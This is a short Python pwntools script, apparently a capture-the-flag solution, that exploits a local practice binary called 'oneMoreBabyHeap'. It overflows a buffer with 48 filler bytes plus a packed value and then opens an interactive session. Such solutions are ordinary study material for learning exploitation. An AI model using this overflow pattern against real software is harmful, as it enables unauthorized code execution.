#!/usr/bin/env python3
from pwn import *
p = process("./oneMoreBabyHeap")
payload = b'a'*48 + p32(1404)
for i in range(2):
    print(p.recvline())
p.sendline(payload)
p.interactive()    
